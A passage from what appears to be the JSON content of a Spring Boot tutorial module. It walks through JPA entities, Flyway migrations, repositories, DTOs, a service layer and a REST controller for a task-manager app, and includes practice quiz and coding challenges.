getTasks() { return tasks; }\n    public void setTasks(List<Task> tasks) { this.tasks = tasks; }\n    \n    public List<Category> getCategories() { return categories; }\n    public void setCategories(List<Category> categories) { this.categories = categories; }\n}\n```\n\nAnnotation Deep Dive:\n- @Entity: Marks this class as a JPA entity (maps to database table)\n- @Table(name = \"users\"): Explicit table name (avoids reserved word issues)\n- @Id + @GeneratedValue: Auto-generated primary key using database sequence\n- @Column: Defines column constraints (unique, nullable, length)\n- @Enumerated(EnumType.STRING): Stores enum as string \"USER\" not ordinal 0\n- @OneToMany: Defines the \"one\" side of one-to-many relationship\n- cascade = CascadeType.ALL: All operations cascade to children\n- orphanRemoval = true: Delete children when removed from collection\n- @PrePersist: Lifecycle hook that runs before INSERT"
            },
            {
              "type": "THEORY",
              "title": "JPA Entity: Category",
              "content": "The Category entity allows users to organize their tasks into logical groups.\n\n```java\npackage com.taskmanager.model;\n\nimport jakarta.persistence.*;\nimport java.time.LocalDateTime;\nimport java.util.ArrayList;\nimport java.util.List;\n\n@Entity\n@Table(name = \"categories\", \n       uniqueConstraints = @UniqueConstraint(columnNames = {\"name\", \"owner_id\"}))\npublic class Category {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(nullable = false, length = 50)\n    private String name;\n    \n    @Column(length = 255)\n    private String description;\n    \n    @Column(length = 7)\n    private String color = \"#6B7280\"; // Default gray\n    \n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"owner_id\", nullable = false)\n    private User owner;\n    \n    @OneToMany(mappedBy = \"category\")\n    private List<Task> tasks = new ArrayList<>();\n    \n    @Column(name = \"created_at\", updatable = false)\n    private LocalDateTime createdAt;\n    \n    public Category() {}\n    \n    public Category(String name, String description, String color, User owner) {\n        this.name = name;\n        this.description = description;\n        this.color = color;\n        this.owner = owner;\n    }\n    \n    @PrePersist\n    protected void onCreate() {\n        this.createdAt = LocalDateTime.now();\n    }\n    \n    // Getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getName() { return name; }\n    public void setName(String name) { this.name = name; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { this.description = description; }\n    \n    public String getColor() { return color; }\n    public void setColor(String color) { this.color = color; }\n    \n    public User getOwner() { return owner; }\n    public void setOwner(User owner) { this.owner = owner; }\n    \n    public List<Task> getTasks() { return tasks; }\n    public void setTasks(List<Task> tasks) { this.tasks = tasks; }\n    \n    public LocalDateTime getCreatedAt() { return createdAt; }\n}\n```\n\nKey Design Decisions:\n- Composite unique constraint: Each user can only have one category with a given name\n- FetchType.LAZY: Do not load owner automatically (prevents N+1 queries)\n- No cascade on tasks: Deleting category does not delete tasks, just sets category to null\n- Color field: Hex color for UI display, makes the app more visually appealing"
            },
            {
              "type": "THEORY",
              "title": "JPA Entity: Task",
              "content": "The Task entity is the core of our application. It contains all the information about a work item.\n\n```java\npackage com.taskmanager.model;\n\nimport com.taskmanager.model.enums.Priority;\nimport com.taskmanager.model.enums.TaskStatus;\nimport jakarta.persistence.*;\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\n\n@Entity\n@Table(name = \"tasks\")\npublic class Task {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(nullable = false, length = 255)\n    private String title;\n    \n    @Column(columnDefinition = \"TEXT\")\n    private String description;\n    \n    @Enumerated(EnumType.STRING)\n    @Column(nullable = false)\n    private TaskStatus status = TaskStatus.PENDING;\n    \n    @Enumerated(EnumType.STRING)\n    @Column(nullable = false)\n    private Priority priority = Priority.MEDIUM;\n    \n    @Column(name = \"due_date\")\n    private LocalDate dueDate;\n    \n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"owner_id\", nullable = false)\n    private User owner;\n    \n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"category_id\")\n    private Category category;\n    \n    @Column(name = \"created_at\", updatable = false)\n    private LocalDateTime createdAt;\n    \n    @Column(name = \"updated_at\")\n    private LocalDateTime updatedAt;\n    \n    public Task() {}\n    \n    public Task(String title, String description, User owner) {\n        this.title = title;\n        this.description = description;\n        this.owner = owner;\n        this.status = TaskStatus.PENDING;\n        this.priority = Priority.MEDIUM;\n    }\n    \n    @PrePersist\n    protected void onCreate() {\n        this.createdAt = LocalDateTime.now();\n        this.updatedAt = LocalDateTime.now();\n    }\n    \n    @PreUpdate\n    protected void onUpdate() {\n        this.updatedAt = LocalDateTime.now();\n    }\n    \n    // Getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getTitle() { return title; }\n    public void setTitle(String title) { this.title = title; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { this.description = description; }\n    \n    public TaskStatus getStatus() { return status; }\n    public void setStatus(TaskStatus status) { this.status = status; }\n    \n    public Priority getPriority() { return priority; }\n    public void setPriority(Priority priority) { this.priority = priority; }\n    \n    public LocalDate getDueDate() { return dueDate; }\n    public void setDueDate(LocalDate dueDate) { this.dueDate = dueDate; }\n    \n    public User getOwner() { return owner; }\n    public void setOwner(User owner) { this.owner = owner; }\n    \n    public Category getCategory() { return category; }\n    public void setCategory(Category category) { this.category = category; }\n    \n    public LocalDateTime getCreatedAt() { return createdAt; }\n    public LocalDateTime getUpdatedAt() { return updatedAt; }\n}\n```\n\nThe Task entity demonstrates:\n- Multiple enums for type-safe status and priority\n- Optional relationship to Category (nullable)\n- Both createdAt and updatedAt timestamps\n- LocalDate for dueDate (date only, no time)\n- TEXT column type for potentially long descriptions"
            },
            {
              "type": "THEORY",
              "title": "Enum Types for Type Safety",
              "content": "We use enums to ensure only valid values are stored in the database. Create these in the model/enums package.\n\n```java\n// com/taskmanager/model/enums/Role.java\npackage com.taskmanager.model.enums;\n\npublic enum Role {\n    USER,\n    ADMIN\n}\n\n// com/taskmanager/model/enums/TaskStatus.java\npackage com.taskmanager.model.enums;\n\npublic enum TaskStatus {\n    PENDING,\n    IN_PROGRESS,\n    COMPLETED,\n    CANCELLED\n}\n\n// com/taskmanager/model/enums/Priority.java\npackage com.taskmanager.model.enums;\n\npublic enum Priority {\n    LOW,\n    MEDIUM,\n    HIGH,\n    URGENT\n}\n```\n\nWhy Enums Instead of Strings?\n\n1. Type Safety: The compiler prevents invalid values. You cannot set status to \"DONE\" - it must be a TaskStatus value.\n\n2. Refactoring: If you rename PENDING to TODO, your IDE updates all usages. With strings, you would miss some.\n\n3. Documentation: Enums are self-documenting. Anyone reading the code knows exactly what values are valid.\n\n4. No Magic Strings: Strings like \"pending\" are error-prone (typos, case sensitivity). Enums eliminate this.\n\n5. Database Storage: With @Enumerated(EnumType.STRING), the database stores \"PENDING\" not 0. This is readable and safer if you reorder enums."
            },
            {
              "type": "THEORY",
              "title": "Flyway Migration Scripts",
              "content": "Flyway manages database schema changes through versioned SQL scripts. Create these in src/main/resources/db/migration:\n\n```sql\n-- V1__create_users.sql\nCREATE TABLE users (\n    id BIGSERIAL PRIMARY KEY,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    password VARCHAR(255) NOT NULL,\n    name VARCHAR(100),\n    role VARCHAR(20) NOT NULL DEFAULT 'USER',\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_users_email ON users(email);\n\n-- V2__create_categories.sql\nCREATE TABLE categories (\n    id BIGSERIAL PRIMARY KEY,\n    name VARCHAR(50) NOT NULL,\n    description VARCHAR(255),\n    color VARCHAR(7) DEFAULT '#6B7280',\n    owner_id BIGINT NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\n    UNIQUE(name, owner_id)\n);\n\nCREATE INDEX idx_categories_owner ON categories(owner_id);\n\n-- V3__create_tasks.sql\nCREATE TABLE tasks (\n    id BIGSERIAL PRIMARY KEY,\n    title VARCHAR(255) NOT NULL,\n    description TEXT,\n    status VARCHAR(20) NOT NULL DEFAULT 'PENDING',\n    priority VARCHAR(20) NOT NULL DEFAULT 'MEDIUM',\n    due_date DATE,\n    owner_id BIGINT NOT NULL REFERENCES users(id) ON DELETE CASCADE,\n    category_id BIGINT REFERENCES categories(id) ON DELETE SET NULL,\n    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_tasks_owner ON tasks(owner_id);\nCREATE INDEX idx_tasks_status ON tasks(status);\nCREATE INDEX idx_tasks_due_date ON tasks(due_date);\nCREATE INDEX idx_tasks_category ON tasks(category_id);\n```\n\nFlyway Naming Convention:\n- V1__description.sql - Version number + double underscore + description\n- Scripts run in version order (V1, V2, V3...)\n- Never modify a migration that has been applied!\n- Add new migrations for schema changes\n\nKey SQL Features:\n- BIGSERIAL: Auto-incrementing 64-bit integer (PostgreSQL)\n- REFERENCES: Foreign key constraint\n- ON DELETE CASCADE: Delete children when parent is deleted\n- ON DELETE SET NULL: Set to null when referenced row is deleted\n- Indexes: Improve query performance on frequently filtered columns"
            },
            {
              "type": "THEORY",
              "title": "Repository Interfaces",
              "content": "Spring Data JPA generates repository implementations automatically. We only need to define interfaces.\n\n```java\n// com/taskmanager/repository/UserRepository.java\npackage com.taskmanager.repository;\n\nimport com.taskmanager.model.User;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.stereotype.Repository;\nimport java.util.Optional;\n\n@Repository\npublic interface UserRepository extends JpaRepository<User, Long> {\n    Optional<User> findByEmail(String email);\n    boolean existsByEmail(String email);\n}\n\n// com/taskmanager/repository/CategoryRepository.java\npackage com.taskmanager.repository;\n\nimport com.taskmanager.model.Category;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.stereotype.Repository;\nimport java.util.List;\nimport java.util.Optional;\n\n@Repository\npublic interface CategoryRepository extends JpaRepository<Category, Long> {\n    List<Category> findByOwnerId(Long ownerId);\n    Optional<Category> findByIdAndOwnerId(Long id, Long ownerId);\n    boolean existsByNameAndOwnerId(String name, Long ownerId);\n}\n\n// com/taskmanager/repository/TaskRepository.java\npackage com.taskmanager.repository;\n\nimport com.taskmanager.model.Task;\nimport com.taskmanager.model.enums.TaskStatus;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.Query;\nimport org.springframework.data.repository.query.Param;\nimport org.springframework.stereotype.Repository;\nimport java.time.LocalDate;\nimport java.util.List;\nimport java.util.Optional;\n\n@Repository\npublic interface TaskRepository extends JpaRepository<Task, Long> {\n    \n    Page<Task> findByOwnerId(Long ownerId, Pageable pageable);\n    \n    Optional<Task> findByIdAndOwnerId(Long id, Long ownerId);\n    \n    List<Task> findByOwnerIdAndStatus(Long ownerId, TaskStatus status);\n    \n    List<Task> findByOwnerIdAndCategoryId(Long ownerId, Long categoryId);\n    \n    @Query(\"SELECT t FROM Task t WHERE t.owner.id = :ownerId \" +\n           \"AND t.dueDate <= :date AND t.status != 'COMPLETED'\")\n    List<Task> findOverdueTasks(@Param(\"ownerId\") Long ownerId, \n                                 @Param(\"date\") LocalDate date);\n    \n    @Query(\"SELECT COUNT(t) FROM Task t WHERE t.owner.id = :ownerId \" +\n           \"AND t.status = :status\")\n    long countByOwnerIdAndStatus(@Param(\"ownerId\") Long ownerId, \n                                  @Param(\"status\") TaskStatus status);\n}\n```\n\nSpring Data JPA Magic:\n- findByEmail: Generates SELECT * FROM users WHERE email = ?\n- existsByEmail: Generates SELECT COUNT(*) > 0 FROM users WHERE email = ?\n- findByOwnerId with Pageable: Adds LIMIT, OFFSET, ORDER BY automatically\n- @Query: For complex queries that cannot be derived from method names\n- @Param: Named parameters in JPQL queries\n\nReturn Types:\n- Optional<T>: For single results that might not exist\n- List<T>: For multiple results (empty list if none)\n- Page<T>: For paginated results with total count"
            },
            {
              "type": "KEY_POINT",
              "title": "Docker Compose for Local Development",
              "content": "Instead of installing PostgreSQL locally, use Docker Compose for consistent development environments.\n\n```yaml\n# docker-compose.yml (in project root)\nversion: '3.8'\n\nservices:\n  postgres:\n    image: postgres:16-alpine\n    container_name: taskmanager-db\n    environment:\n      POSTGRES_DB: taskmanager\n      POSTGRES_USER: taskuser\n      POSTGRES_PASSWORD: localdev123\n    ports:\n      - \"5432:5432\"\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U taskuser -d taskmanager\"]\n      interval: 5s\n      timeout: 5s\n      retries: 5\n\nvolumes:\n  postgres_data:\n```\n\nUsage Commands:\n- docker compose up -d: Start database in background\n- docker compose logs -f postgres: View database logs\n- docker compose down: Stop database (data preserved)\n- docker compose down -v: Stop and delete all data (fresh start)\n\nBenefits:\n- One command starts everything needed\n- Same environment for all team members\n- Easy to reset: down -v, then up -d\n- Matches production environment\n- No \"works on my machine\" problems"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-2-cascade",
              "title": "Understanding Cascade Types",
              "description": "Test your understanding of JPA cascade behavior.",
              "question": "In the User entity, we have @OneToMany(cascade = CascadeType.ALL, orphanRemoval = true) for tasks. What happens when we call userRepository.delete(user)?",
              "options": [
                {
                  "id": "a",
                  "text": "Only the user is deleted, tasks remain with null owner",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "The deletion fails because tasks still reference the user",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "The user and all their tasks are deleted automatically",
                  "isCorrect": true
                },
                {
                  "id": "d",
                  "text": "Tasks are moved to a default system user",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-2-flyway",
              "title": "Flyway Migration Best Practices",
              "description": "Understand proper schema migration workflow.",
              "question": "You need to add a 'completed_at' timestamp column to the tasks table. The V3__create_tasks.sql migration has already been applied. What should you do?",
              "options": [
                {
                  "id": "a",
                  "text": "Edit V3__create_tasks.sql to add the column",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "Create V4__add_completed_at_to_tasks.sql with ALTER TABLE",
                  "isCorrect": true
                },
                {
                  "id": "c",
                  "text": "Delete the flyway_schema_history table and re-run all migrations",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "Add the column directly to the entity and let Hibernate update the schema",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-2-repository-method",
              "title": "Write a Custom Repository Method",
              "description": "Add a method to TaskRepository that finds all high-priority tasks for a user that are not yet completed.",
              "instructions": "Write a repository method signature in TaskRepository that finds all tasks where:\n1. The owner matches the given ownerId\n2. Priority is HIGH or URGENT\n3. Status is not COMPLETED\n\nUse Spring Data JPA query derivation (method naming convention).",
              "starterCode": "// Add this method to TaskRepository interface\n// Find all incomplete high priority tasks for a user\n\n// Your method signature here:\n",
              "solution": "// Method using Spring Data JPA query derivation:\nList<Task> findByOwnerIdAndPriorityInAndStatusNot(\n    Long ownerId, \n    List<Priority> priorities, \n    TaskStatus status\n);\n\n// Called like:\n// taskRepository.findByOwnerIdAndPriorityInAndStatusNot(\n//     userId, \n//     List.of(Priority.HIGH, Priority.URGENT), \n//     TaskStatus.COMPLETED\n// );\n\n// Alternative using @Query:\n@Query(\"SELECT t FROM Task t WHERE t.owner.id = :ownerId \" +\n       \"AND t.priority IN ('HIGH', 'URGENT') \" +\n       \"AND t.status != 'COMPLETED'\")\nList<Task> findHighPriorityIncompleteTasks(@Param(\"ownerId\") Long ownerId);",
              "language": "java",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Spring Data JPA can derive queries from method names. findByOwnerIdAndPriorityAndStatus would match exact values."
                },
                {
                  "level": 2,
                  "text": "Use 'In' suffix for matching multiple values, and 'Not' suffix for negation."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-3",
          "title": "Lesson 16.3: REST API Development",
          "moduleId": "module-16",
          "order": 3,
          "estimatedMinutes": 60,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "REST API Design Principles",
              "content": "A well-designed REST API follows consistent conventions that make it intuitive for frontend developers and other API consumers. Let us establish our design principles.\n\nURL Structure:\nResources are nouns (not verbs), plural form:\n- /api/tasks (not /api/getTask or /api/task)\n- /api/categories (not /api/category)\n- /api/users (not /api/user)\n\nHTTP Methods define actions:\n- GET /api/tasks - List all tasks (for current user)\n- GET /api/tasks/123 - Get specific task\n- POST /api/tasks - Create new task\n- PUT /api/tasks/123 - Update entire task\n- PATCH /api/tasks/123 - Partial update\n- DELETE /api/tasks/123 - Delete task\n\nHTTP Status Codes communicate results:\n- 200 OK: Successful GET, PUT, PATCH\n- 201 Created: Successful POST (include Location header)\n- 204 No Content: Successful DELETE\n- 400 Bad Request: Invalid input data\n- 401 Unauthorized: Not authenticated\n- 403 Forbidden: Authenticated but not authorized\n- 404 Not Found: Resource does not exist\n- 409 Conflict: Duplicate resource (e.g., email exists)\n- 500 Internal Server Error: Server-side failure\n\nRequest/Response Format:\n- Always JSON (Content-Type: application/json)\n- Use camelCase for field names (not snake_case)\n- Include metadata for paginated responses\n- Never expose internal entity IDs in URLs for security-sensitive operations"
            },
            {
              "type": "THEORY",
              "title": "Data Transfer Objects (DTOs)",
              "content": "DTOs separate our API contract from our internal entities. This provides several benefits: security (we control what is exposed), flexibility (API can differ from database), and stability (internal changes do not break API).\n\n```java\n// com/taskmanager/dto/request/TaskRequest.java\npackage com.taskmanager.dto.request;\n\nimport com.taskmanager.model.enums.Priority;\nimport com.taskmanager.model.enums.TaskStatus;\nimport jakarta.validation.constraints.NotBlank;\nimport jakarta.validation.constraints.Size;\nimport java.time.LocalDate;\n\npublic class TaskRequest {\n    \n    @NotBlank(message = \"Title is required\")\n    @Size(max = 255, message = \"Title must be less than 255 characters\")\n    private String title;\n    \n    @Size(max = 5000, message = \"Description must be less than 5000 characters\")\n    private String description;\n    \n    private TaskStatus status;\n    \n    private Priority priority;\n    \n    private LocalDate dueDate;\n    \n    private Long categoryId;\n    \n    // Getters and setters\n    public String getTitle() { return title; }\n    public void setTitle(String title) { this.title = title; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { this.description = description; }\n    \n    public TaskStatus getStatus() { return status; }\n    public void setStatus(TaskStatus status) { this.status = status; }\n    \n    public Priority getPriority() { return priority; }\n    public void setPriority(Priority priority) { this.priority = priority; }\n    \n    public LocalDate getDueDate() { return dueDate; }\n    public void setDueDate(LocalDate dueDate) { this.dueDate = dueDate; }\n    \n    public Long getCategoryId() { return categoryId; }\n    public void setCategoryId(Long categoryId) { this.categoryId = categoryId; }\n}\n```\n\nValidation annotations ensure data integrity before it reaches the service layer. @NotBlank checks for null and empty strings, @Size limits string length."
            },
            {
              "type": "THEORY",
              "title": "Response DTOs",
              "content": "Response DTOs define exactly what data we return to clients. They never include sensitive information like passwords.\n\n```java\n// com/taskmanager/dto/response/TaskResponse.java\npackage com.taskmanager.dto.response;\n\nimport com.taskmanager.model.Task;\nimport com.taskmanager.model.enums.Priority;\nimport com.taskmanager.model.enums.TaskStatus;\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\n\npublic class TaskResponse {\n    \n    private Long id;\n    private String title;\n    private String description;\n    private TaskStatus status;\n    private Priority priority;\n    private LocalDate dueDate;\n    private CategoryResponse category;\n    private LocalDateTime createdAt;\n    private LocalDateTime updatedAt;\n    \n    // Factory method to create from entity\n    public static TaskResponse fromEntity(Task task) {\n        TaskResponse response = new TaskResponse();\n        response.setId(task.getId());\n        response.setTitle(task.getTitle());\n        response.setDescription(task.getDescription());\n        response.setStatus(task.getStatus());\n        response.setPriority(task.getPriority());\n        response.setDueDate(task.getDueDate());\n        response.setCreatedAt(task.getCreatedAt());\n        response.setUpdatedAt(task.getUpdatedAt());\n        \n        if (task.getCategory() != null) {\n            response.setCategory(CategoryResponse.fromEntity(task.getCategory()));\n        }\n        \n        return response;\n    }\n    \n    // Getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getTitle() { return title; }\n    public void setTitle(String title) { this.title = title; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { this.description = description; }\n    \n    public TaskStatus getStatus() { return status; }\n    public void setStatus(TaskStatus status) { this.status = status; }\n    \n    public Priority getPriority() { return priority; }\n    public void setPriority(Priority priority) { this.priority = priority; }\n    \n    public LocalDate getDueDate() { return dueDate; }\n    public void setDueDate(LocalDate dueDate) { this.dueDate = dueDate; }\n    \n    public CategoryResponse getCategory() { return category; }\n    public void setCategory(CategoryResponse category) { this.category = category; }\n    \n    public LocalDateTime getCreatedAt() { return createdAt; }\n    public void setCreatedAt(LocalDateTime createdAt) { this.createdAt = createdAt; }\n    \n    public LocalDateTime getUpdatedAt() { return updatedAt; }\n    public void setUpdatedAt(LocalDateTime updatedAt) { this.updatedAt = updatedAt; }\n}\n\n// com/taskmanager/dto/response/CategoryResponse.java\npackage com.taskmanager.dto.response;\n\nimport com.taskmanager.model.Category;\n\npublic class CategoryResponse {\n    \n    private Long id;\n    private String name;\n    private String description;\n    private String color;\n    \n    public static CategoryResponse fromEntity(Category category) {\n        CategoryResponse response = new CategoryResponse();\n        response.setId(category.getId());\n        response.setName(category.getName());\n        response.setDescription(category.getDescription());\n        response.setColor(category.getColor());\n        return response;\n    }\n    \n    // Getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getName() { return name; }\n    public void setName(String name) { this.name = name; }\n    \n    public String getDescription() { return description; }\n    public void setDescription(String description) { this.description = description; }\n    \n    public String getColor() { return color; }\n    public void setColor(String color) { this.color = color; }\n}\n```\n\nNotice the fromEntity factory method. This pattern keeps entity-to-DTO conversion logic in one place, making it easy to maintain and test."
            },
            {
              "type": "THEORY",
              "title": "Service Layer Pattern",
              "content": "The service layer contains business logic and coordinates between controllers and repositories. Controllers should be thin - they handle HTTP concerns only.\n\n```java\n// com/taskmanager/service/TaskService.java\npackage com.taskmanager.service;\n\nimport com.taskmanager.dto.request.TaskRequest;\nimport com.taskmanager.dto.response.TaskResponse;\nimport com.taskmanager.exception.ResourceNotFoundException;\nimport com.taskmanager.exception.UnauthorizedException;\nimport com.taskmanager.model.Category;\nimport com.taskmanager.model.Task;\nimport com.taskmanager.model.User;\nimport com.taskmanager.model.enums.Priority;\nimport com.taskmanager.model.enums.TaskStatus;\nimport com.taskmanager.repository.CategoryRepository;\nimport com.taskmanager.repository.TaskRepository;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\n@Service\n@Transactional\npublic class TaskService {\n    \n    private final TaskRepository taskRepository;\n    private final CategoryRepository categoryRepository;\n    \n    public TaskService(TaskRepository taskRepository, \n                       CategoryRepository categoryRepository) {\n        this.taskRepository = taskRepository;\n        this.categoryRepository = categoryRepository;\n    }\n    \n    @Transactional(readOnly = true)\n    public Page<TaskResponse> getTasksForUser(User user, Pageable pageable) {\n        return taskRepository.findByOwnerId(user.getId(), pageable)\n                .map(TaskResponse::fromEntity);\n    }\n    \n    @Transactional(readOnly = true)\n    public TaskResponse getTask(Long taskId, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n        return TaskResponse.fromEntity(task);\n    }\n    \n    public TaskResponse createTask(TaskRequest request, User user) {\n        Task task = new Task();\n        task.setTitle(request.getTitle());\n        task.setDescription(request.getDescription());\n        task.setStatus(request.getStatus() != null ? request.getStatus() : TaskStatus.PENDING);\n        task.setPriority(request.getPriority() != null ? request.getPriority() : Priority.MEDIUM);\n        task.setDueDate(request.getDueDate());\n        task.setOwner(user);\n        \n        if (request.getCategoryId() != null) {\n            Category category = categoryRepository\n                .findByIdAndOwnerId(request.getCategoryId(), user.getId())\n                .orElseThrow(() -> new ResourceNotFoundException(\n                    \"Category not found with id: \" + request.getCategoryId()));\n            task.setCategory(category);\n        }\n        \n        Task saved = taskRepository.save(task);\n        return TaskResponse.fromEntity(saved);\n    }\n    \n    public TaskResponse updateTask(Long taskId, TaskRequest request, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n        \n        task.setTitle(request.getTitle());\n        task.setDescription(request.getDescription());\n        if (request.getStatus() != null) {\n            task.setStatus(request.getStatus());\n        }\n        if (request.getPriority() != null) {\n            task.setPriority(request.getPriority());\n        }\n        task.setDueDate(request.getDueDate());\n        \n        if (request.getCategoryId() != null) {\n            Category category = categoryRepository\n                .findByIdAndOwnerId(request.getCategoryId(), user.getId())\n                .orElseThrow(() -> new ResourceNotFoundException(\n                    \"Category not found with id: \" + request.getCategoryId()));\n            task.setCategory(category);\n        } else {\n            task.setCategory(null);\n        }\n        \n        Task saved = taskRepository.save(task);\n        return TaskResponse.fromEntity(saved);\n    }\n    \n    public void deleteTask(Long taskId, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n        taskRepository.delete(task);\n    }\n    \n    private Task findTaskAndVerifyOwnership(Long taskId, User user) {\n        return taskRepository.findByIdAndOwnerId(taskId, user.getId())\n                .orElseThrow(() -> new ResourceNotFoundException(\n                    \"Task not found with id: \" + taskId));\n    }\n}\n```\n\nKey Service Layer Principles:\n- @Service marks this as a Spring-managed service bean\n- @Transactional ensures database operations are atomic\n- @Transactional(readOnly = true) optimizes read-only operations\n- Constructor injection for dependencies (not @Autowired on fields)\n- Always verify ownership before modifying resources\n- Convert entities to DTOs before returning"
            },
            {
              "type": "THEORY",
              "title": "TaskController: Full CRUD Implementation",
              "content": "The controller handles HTTP requests, delegates to services, and returns proper responses.\n\n```java\n// com/taskmanager/controller/TaskController.java\npackage com.taskmanager.controller;\n\nimport com.taskmanager.dto.request.TaskRequest;\nimport com.taskmanager.dto.response.TaskResponse;\nimport com.taskmanager.model.User;\nimport com.taskmanager.service.TaskService;\nimport jakarta.validation.Valid;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.security.core.annotation.AuthenticationPrincipal;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.net.URI;\n\n@RestController\n@RequestMapping(\"/api/tasks\")\npublic class TaskController {\n    \n    private final TaskService taskService;\n    \n    public TaskController(TaskService taskService) {\n        this.taskService = taskService;\n    }\n    \n    @GetMapping\n    public ResponseEntity<Page<TaskResponse>> getAllTasks(\n            @AuthenticationPrincipal User user,\n            @PageableDefault(size = 20, sort = \"createdAt\", \n                           direction = Sort.Direction.DESC) Pageable pageable) {\n        Page<TaskResponse> tasks = taskService.getTasksForUser(user, pageable);\n        return ResponseEntity.ok(tasks);\n    }\n    \n    @GetMapping(\"/{id}\")\n    public ResponseEntity<TaskResponse> getTask(\n            @PathVariable Long id,\n            @AuthenticationPrincipal User user) {\n        TaskResponse task = taskService.getTask(id, user);\n        return ResponseEntity.ok(task);\n    }\n    \n    @PostMapping\n    public ResponseEntity<TaskResponse> createTask(\n            @Valid @RequestBody TaskRequest request,\n            @AuthenticationPrincipal User user) {\n        TaskResponse created = taskService.createTask(request, user);\n        URI location = URI.create(\"/api/tasks/\" + created.getId());\n        return ResponseEntity.created(location).body(created);\n    }\n    \n    @PutMapping(\"/{id}\")\n    public ResponseEntity<TaskResponse> updateTask(\n            @PathVariable Long id,\n            @Valid @RequestBody TaskRequest request,\n            @AuthenticationPrincipal User user) {\n        TaskResponse updated = taskService.updateTask(id, request, user);\n        return ResponseEntity.ok(updated);\n    }\n    \n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> deleteTask(\n            @PathVariable Long id,\n            @AuthenticationPrincipal User user) {\n        taskService.deleteTask(id, user);\n        return ResponseEntity.noContent().build();\n    }\n}\n```\n\nController Annotations Explained:\n- @RestController: Combines @Controller and @ResponseBody (returns JSON)\n- @RequestMapping(\"/api/tasks\"): Base URL for all endpoints\n- @GetMapping, @PostMapping, etc.: Map HTTP methods to handlers\n- @PathVariable: Extract values from URL path\n- @RequestBody: Deserialize JSON body to object\n- @Valid: Trigger validation annotations on the request object\n- @AuthenticationPrincipal: Inject the currently authenticated user\n- @PageableDefault: Set default pagination (size, sort field, direction)"
            },
            {
              "type": "THEORY",
              "title": "Pagination with Page and Pageable",
              "content": "Pagination is essential for APIs that return potentially large collections. Spring Data provides excellent pagination support out of the box.\n\nClient Request:\nGET /api/tasks?page=0&size=10&sort=dueDate,asc\n\nParsed by Spring into Pageable:\n- page: 0 (first page, zero-indexed)\n- size: 10 (items per page)\n- sort: dueDate ascending\n\nRepository method returns Page<Task>:\n```java\nPage<Task> findByOwnerId(Long ownerId, Pageable pageable);\n```\n\nPage object contains:\n- content: List of items for this page\n- totalElements: Total count across all pages\n- totalPages: Calculated from totalElements and size\n- number: Current page number\n- size: Requested page size\n- numberOfElements: Actual items on this page\n\nJSON Response Structure:\n```json\n{\n  \"content\": [\n    { \"id\": 1, \"title\": \"Task 1\", ... },\n    { \"id\": 2, \"title\": \"Task 2\", ... }\n  ],\n  \"pageable\": {\n    \"pageNumber\": 0,\n    \"pageSize\": 10,\n    \"sort\": { \"sorted\": true, \"direction\": \"ASC\" }\n  },\n  \"totalElements\": 47,\n  \"totalPages\": 5,\n  \"last\": false,\n  \"first\": true,\n  \"empty\": false\n}\n```\n\nFrontend can use this metadata to render pagination controls (\"Page 1 of 5\", Previous/Next buttons)."
